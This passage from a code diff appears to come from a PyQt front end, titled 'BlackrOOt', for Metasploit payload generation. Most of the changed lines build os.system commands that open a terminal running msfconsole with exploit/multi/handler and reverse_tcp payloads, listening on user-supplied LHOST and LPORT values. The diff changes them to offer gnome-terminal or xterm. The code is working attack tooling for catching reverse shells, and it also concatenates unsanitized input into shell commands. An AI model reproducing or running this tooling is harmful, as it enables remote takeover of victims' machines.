+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "java":
@@ -452,7 +540,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 				elif self.formats.currentText() == "jar":
@@ -466,7 +558,11 @@ try:
 						ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 						runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 						if runmetasploit == QMessageBox.Yes:
-							os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+							terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+							if terminal == 0:
+								os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+							elif terminal == 1:
+								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 					else:
 						error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 			####################################################################################################
@@ -484,7 +580,11 @@ try:
 								ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 								runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 								if runmetasploit == QMessageBox.Yes:
-									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+									terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+									if terminal == 0:
+										os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+									elif terminal == 1:
+										os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 							else:
 								error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 						elif self.payload.currentText() == "meterpreter":
@@ -501,7 +601,11 @@ try:
 							ok_save = QMessageBox.about(self.window,"GOOD","Saved as : "+str(self.save.text()+"."+self.formats.currentText()))
 							runmetasploit = QMessageBox.question(self.window,"run Metasploit ? ","Do you want to create a session listening ? ",QMessageBox.Yes|QMessageBox.No)
 							if runmetasploit == QMessageBox.Yes:
-								os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"_reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
+								terminal = QMessageBox.question(self.window,"Terminal ? ","Use Terminal ? ","gnome-terminal","xterm")
+								if terminal == 0:
+									os.system("gnome-terminal -e \'msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"'")
+								elif terminal == 1:
+									os.system("xterm -title BlackrOOt -e msfconsole -x \"use exploit/multi/handler;set payload "+str(self.platforms.currentText())+"/"+str(self.payload.currentText())+"/reverse_tcp ; set LHOST "+str(self.lhost.text())+";set LPORT "+str(self.lport.text())+";exploit -j\"")
 						else:
 							error_save = QMessageBox.about(self.window,"ERROR","ERROR")
 					elif self.payload.currentText() == "meterpreter":
